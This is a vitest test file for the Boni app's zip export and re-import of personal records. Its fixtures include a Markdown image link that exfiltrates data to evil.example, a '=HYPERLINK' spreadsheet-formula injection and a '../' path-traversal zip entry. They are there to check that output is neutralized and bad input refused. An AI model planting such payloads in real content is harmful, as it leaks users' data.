import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { ensureSystemTypes } from "@boni/agent";
import { type FieldDef, label, type TypeDef } from "@boni/entities";
import { openUserStore, type UserStore, type Writes } from "@boni/store";
import { afterEach, describe, expect, it } from "vitest";
import { exportChunks, exportFiles, exportZip } from "./export.ts";
import { ExportFormatError, importExport } from "./reimport.ts";
import { entryData, readZip, writeZip, type ZipEntry, ZipError, zipChunks } from "./zip.ts";

const NOW = Date.UTC(2026, 9, 20, 12);
const cleanups: (() => void)[] = [];
afterEach(() => {
  for (const c of cleanups.splice(0)) c();
});
function store(): UserStore {
  const s = openUserStore(":memory:", { now: () => NOW });
  ensureSystemTypes(s);
  cleanups.push(() => s.close());
  return s;
}

/** Collections made as Juan's import made them (never real data): fields by key, the hidden path of each note. */
const SCHEMA = label("imported", "public", [{ kind: "vault", id: "import" }]);
const META = { actor: "import" as const, run: "import-1" };
const field = (key: string, type: FieldDef["type"], extra: Partial<FieldDef> = {}): FieldDef => ({
  id: `f_${key.replace(/-/g, "_")}`,
  key,
  name: key,
  type,
  label: SCHEMA,
  ...extra,
});
const PATH = field("vault-path", "text", {
  id: "f_vault_path",
  name: "Nota del vault",
  hidden: true,
});
function makeType(
  s: UserStore,
  key: string,
  name: string,
  fields: FieldDef[],
  extra: Partial<TypeDef> = {},
) {
  const def: TypeDef = {
    id: `t_${key.replace(/-/g, "_")}`,
    key,
    name,
    fields: [field("title", "text", { name: "Título" }), ...fields, PATH],
    titleField: "f_title",
    sensitivity: "personal",
    schemaVersion: 1,
    label: SCHEMA,
    ...extra,
  };
  s.applySchema({ op: "create_type", type: def }, META);
  return def.id;
}
/** An entry with its note's values, every one `imported` from that note. */
function entry(
  s: UserStore,
  type: string,
  path: string,
  values: Record<string, unknown>,
  body?: string,
) {
  const l = label("imported", "personal", [{ kind: "vault", id: path }]);
  const writes: Writes = { f_vault_path: { value: path, label: l } };
  for (const [k, v] of Object.entries(values)) writes[`f_${k}`] = { value: v, label: l };
  if (body) writes.$body = { value: body, label: l };
  return s.create(type, writes, META).entity.id;
}
const option = (name: string) => ({ id: `o_${name}`, name, label: SCHEMA });

/** People, projects with relations, a movement (invented): as they came into Boni. */
function filled(): UserStore {
  const s = store();
  const persona = makeType(
    s,
    "persona",
    "Persona",
    [
      field("type", "text"),
      field("tags", "multiselect", { options: ["ucam", "profesor", "amigo"].map(option) }),
    ],
    { thirdParty: true },
  );
  const proyecto = makeType(s, "proyecto", "Proyecto", [
    field("type", "text"),
    field("status", "text"),
  ]);
  s.applySchema(
    {
      op: "add_field",
      type: proyecto,
      field: field("parent", "relation", { relation: { target: proyecto, many: false } }),
    },
    META,
  );
  const movimiento = makeType(
    s,
    "movimiento",
    "Movimiento",
    [
      field("type", "text"),
      field("date", "date"),
      field("amount", "number"),
      field("currency", "text"),
    ],
    { sensitivity: "sensitive" },
  );
  // Links once the collections they point to exist (as the import and the re-import add them).
  s.applySchema(
    {
      op: "add_field",
      type: movimiento,
      field: field("people", "relation", { relation: { target: persona, many: true } }),
    },
    META,
  );
  const ana = entry(s, persona, "registros/personas/ana-ejemplo.md", {
    title: "Ana",
    type: "person",
    tags: ["o_ucam", "o_profesor"],
  });
  const luis = entry(s, persona, "registros/personas/luis-ejemplo.md", {
    title: "luis-ejemplo",
    type: "person",
    tags: ["o_amigo"],
  });
  entry(s, movimiento, "registros/finanzas/movimientos/2026/10/2026-10-19-cafe.md", {
    title: "2026-10-19-cafe",
    type: "movement",
    date: "2026-10-19",
    amount: -1.6,
    currency: "EUR",
    people: [ana, luis],
  });
  const programa = entry(s, proyecto, "proyectos/programa-ejemplo.md", {
    title: "programa-ejemplo",
    type: "project",
    status: "activo",
  });
  entry(
    s,
    proyecto,
    "proyectos/curso-ejemplo.md",
    { title: "curso-ejemplo", type: "project", status: "activo", parent: programa },
    "Notas.\n",
  );
  const mail = label("external", "personal", [{ kind: "mail", id: "m1" }], true);
  const own = label("user", "personal", [{ kind: "turn", id: "t" }]);
  s.update(
    ana,
    {
      $body: { value: "De un correo: ![x](https://evil.example/p.png?d=secreto)", label: mail },
      f_type: { value: '=HYPERLINK("https://evil.example")', label: mail },
    },
    { actor: "agent", run: "r1" },
  );
  const gone = s.create(
    "t_persona",
    { f_title: { value: "Borrada", label: own } },
    { actor: "user" },
  );
  s.remove(gone.entity.id, { actor: "user" });
  return s;
}
const text = (files: Map<string, Buffer>, p: string) => files.get(p)?.toString("utf8") ?? "";

/** A folder of a private zone as Juan imported it: a row per attachment, kept from every model. */
function zoneFiles(s: UserStore, files: Record<string, string>) {
  const type = makeType(s, "private-documentos", "Documentos", [
    field("boni-archivo", "file", { id: "f_boni_file", name: "Archivo" }),
  ]);
  s.setZone(type, "private", "import");
  for (const [name, content] of Object.entries(files)) {
    const l = label("imported", "personal", [{ kind: "vault", id: `private/Documentos/${name}` }]);
    s.create(
      type,
      {
        f_title: { value: name, label: l },
        f_boni_file: { value: s.putFile(Buffer.from(content), "application/pdf"), label: l },
        f_vault_path: { value: `private/Documentos/${name}`, label: l },
      },
      META,
    );
  }
}

describe("a zip written a piece at a time", () => {
  it("reads back the same as one written whole, also with the system's unzip", () => {
    const pieces = [
      Buffer.from("una línea\n"),
      Buffer.alloc(0),
      Buffer.from("otra línea\n".repeat(1000)),
    ];
    const zip = writeZip(
      [
        { path: "a.txt", data: Buffer.from("entera\n") },
        { path: "log.ndjson", chunks: () => pieces },
        { path: "b.txt", data: () => Buffer.from("al final\n") },
      ],
      NOW,
    );
    const files = readZip(zip);
    expect(files.get("log.ndjson")?.equals(Buffer.concat(pieces))).toBe(true);
    expect(files.get("a.txt")?.toString()).toBe("entera\n");
    expect(files.get("b.txt")?.toString()).toBe("al final\n");
    const dir = mkdtempSync(join(tmpdir(), "boni-zip-"));
    cleanups.push(() => rmSync(dir, { recursive: true, force: true }));
    writeFileSync(join(dir, "x.zip"), zip);
    let tested = "";
    try {
      tested = execFileSync("unzip", ["-t", join(dir, "x.zip")], { encoding: "utf8" });
    } catch (e) {
      if ((e as { code?: string }).code !== "ENOENT") throw e;
      tested = "No errors detected (no unzip here)";
    }
    expect(tested).toContain("No errors detected");
  });
});

describe("the export", () => {
  it("is a zip any program opens, with every format", () => {
    const store = filled();
    const zip = exportZip(store, { now: NOW, log: true, views: { charts: [] } });
    const files = readZip(zip);
    expect([...files.keys()].filter((p) => !p.endsWith(".md") || p === "README.md")).toEqual([
      "README.md",
      "csv/movimiento.csv",
      "csv/persona.csv",
      "csv/proyecto.csv",
      // Juan's conversations with Boni are his data too (docs/conversacion.md 3.1).
      "json/conversation.ndjson",
      "json/extension.ndjson",
      "json/job.ndjson",
      "json/memory.ndjson",
      "json/movimiento.ndjson",
      "json/page.ndjson",
      "json/persona.ndjson",
      "json/proyecto.ndjson",
      "json/turn.ndjson",
      "log.ndjson",
      "schema.json",
      "views.json",
    ]);
    expect(files.has("persona/Ana.md")).toBe(true);
    // The log, written a page at a time, is the same as the whole log written at once.
    expect(text(files, "log.ndjson")).toBe(
      store
        .log()
        .map((r) => `${JSON.stringify(r)}\n`)
        .join(""),
    );
    expect(text(files, "README.md")).toContain("Persona (`persona`): 2");
    // The system's own unzip agrees.
    const dir = mkdtempSync(join(tmpdir(), "boni-zip-"));
    cleanups.push(() => rmSync(dir, { recursive: true, force: true }));
    writeFileSync(join(dir, "x.zip"), zip);
    let tested = "";
    try {
      tested = execFileSync("unzip", ["-t", join(dir, "x.zip")], { encoding: "utf8" });
    } catch (e) {
      if ((e as { code?: string }).code !== "ENOENT") throw e;
      tested = "No errors detected (no unzip here)";
    }
    expect(tested).toContain("No errors detected");
  });

  it("leaves the trash out; Markdown is neutralized and CSV never holds a formula", () => {
    const files = readZip(exportZip(filled(), { now: NOW }));
    expect(text(files, "json/persona.ndjson")).not.toContain("Borrada");
    const md = text(files, "persona/Ana.md");
    expect(md).toContain("De un correo: x (https:⁄⁄evil.example/p.png?d=secreto)");
    expect(md).toContain('boni_integrity: "external"');
    expect(text(files, "json/persona.ndjson")).toContain(
      "![x](https://evil.example/p.png?d=secreto)",
    );
    const csv = text(files, "csv/persona.csv");
    expect(csv.startsWith("﻿id,")).toBe(true);
    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example"")"`);
    expect(csv).toContain("amigo");
    const move = text(files, "csv/movimiento.csv");
    expect(move).toContain("Ana; luis-ejemplo"); // Ana is titled by her note's heading
    expect(move).toContain(",-1.6,");
    // Links between notes point to the exported notes.
    expect(text(files, "proyecto/curso-ejemplo.md")).toContain('"[[programa-ejemplo]]"');
    const schema = JSON.parse(text(files, "schema.json"));
    expect(schema.jsonSchema.movimiento.properties.values.properties.amount).toMatchObject({
      type: "number",
    });
  });
});

describe("the export comes back", () => {
  it("re-imported (an export of one's own), it exports again identical", () => {
    const a = filled();
    const first = exportFiles(a, { now: NOW });
    const b = store();
    const files = new Map(first.map((e) => [e.path, entryData(e)]));
    const dry = importExport(files, b);
    expect(dry).toMatchObject({ applied: false, created: 5, existing: [], failed: [] });
    expect(b.list("t_persona")).toHaveLength(0);
    a.setAiAccess("t_persona", "opaque", "portatil");
    const withChoice = new Map(exportFiles(a, { now: NOW }).map((e) => [e.path, entryData(e)]));
    const r = importExport(withChoice, b, { apply: true, trustLabels: true });
    expect(b.aiAccess()).toEqual({ t_persona: "opaque" });
    expect(r).toMatchObject({ applied: true, created: 5, failed: [] });
    const first2 = exportFiles(a, { now: NOW });
    const second = exportFiles(b, { now: NOW });
    const strip = (p: string, d: Buffer) =>
      p.endsWith(".ndjson")
        ? d
            .toString("utf8")
            .split("\n")
            .filter(Boolean)
            .map((l) => {
              const { version: _v, ...rest } = JSON.parse(l);
              return JSON.stringify(rest);
            })
            .join("\n")
        : d.toString("utf8");
    expect(second.map((e) => e.path)).toEqual(first2.map((e) => e.path));
    for (const [i, e] of second.entries())
      expect(strip(e.path, entryData(e)), e.path).toBe(
        strip(e.path, entryData(first2[i] as ZipEntry)),
      );
    // Again: nothing twice.
    expect(importExport(files, b, { apply: true }).existing).toHaveLength(5);
  });

  it("carries a zone's attachments and keeps the zone when re-imported", () => {
    const a = store();
    zoneFiles(a, { "poliza.pdf": "%PDF-1.7 inventado" });
    const sha = String(a.list("t_private_documentos")[0]?.entity.values.f_boni_file);
    const files = new Map(exportFiles(a, { now: NOW }).map((e) => [e.path, entryData(e)]));
    expect(text(files, `files/${sha}`)).toBe("%PDF-1.7 inventado");
    expect(JSON.parse(text(files, "schema.json")).zones).toEqual({
      t_private_documentos: "private",
    });
    const b = store();
    importExport(files, b, { apply: true });
    expect(b.zones()).toEqual({ t_private_documentos: "private" });
    expect(b.aiAccess()).toEqual({ t_private_documentos: "private" });
    expect(Buffer.from(b.getFile(sha)?.data ?? []).toString()).toBe("%PDF-1.7 inventado");
    expect(b.getFile(sha)?.mime).toBe("application/pdf");
  });

  it("streams: an attachment is read only when its turn comes, and the chunks are the same zip", () => {
    const a = store();
    zoneFiles(a, { "uno.pdf": "%PDF-1.7 uno inventado", "dos.pdf": "%PDF-1.7 dos inventado" });
    let reads = 0;
    const counted = new Proxy(a, {
      get: (t, k) =>
        k === "getFile"
          ? (sha: string) => {
              reads++;
              return t.getFile(sha);
            }
          : Reflect.get(t, k),
    });
    const chunks = exportChunks(counted, { now: NOW });
    expect(reads).toBe(0); // nothing read yet: the list says each file's type without its bytes
    const all: Buffer[] = [];
    for (const c of chunks) all.push(c);
    expect(reads).toBe(2);
    expect(Buffer.concat(all).equals(exportZip(a, { now: NOW }))).toBe(true);
    expect(text(readZip(Buffer.concat(all)), "README.md")).toContain("Boni");
    expect(Buffer.concat([...zipChunks([], NOW)]).equals(writeZip([], NOW))).toBe(true);
  });

  it("by default the file's labels are only claims: at most imported, from the export", () => {
    const files = new Map(exportFiles(filled(), { now: NOW }).map((e) => [e.path, entryData(e)]));
    const b = store();
    importExport(files, b, { apply: true, name: "copia.zip" });
    const ana = b
      .list("t_persona")
      .find((x) => x.entity.values.f_vault_path === "registros/personas/ana-ejemplo.md");
    expect(ana?.labels.f_tags?.integrity).toBe("imported");
    expect(ana?.labels.$body?.integrity).toBe("external");
    expect(ana?.labels.f_tags?.sources).toContainEqual({ kind: "export", id: "copia.zip" });
    // A label edited in the file to say "user" is still only imported.
    const edited = new Map(files);
    const line = text(files, "json/persona.ndjson").replaceAll(
      '"integrity":"imported"',
      '"integrity":"user"',
    );
    edited.set("json/persona.ndjson", Buffer.from(line));
    const c = store();
    importExport(edited, c, { apply: true });
    for (const s of c.list("t_persona"))
      for (const l of Object.values(s.labels)) expect(l.integrity).not.toBe("user");
  });

  it("refuses what is not an export, and a zip that would write outside or is damaged", () => {
    expect(() => importExport(new Map([["x.txt", Buffer.from("x")]]), store())).toThrow(
      ExportFormatError,
    );
    expect(() => readZip(writeZip([{ path: "../fuera.txt", data: Buffer.from("x") }]))).toThrow(
      ZipError,
    );
    const zip = writeZip([{ path: "a.txt", data: Buffer.from("hola hola hola") }]);
    zip[40] = (zip[40] as number) ^ 0xff; // inside the packed data
    expect(() => readZip(zip)).toThrow();
  });
});
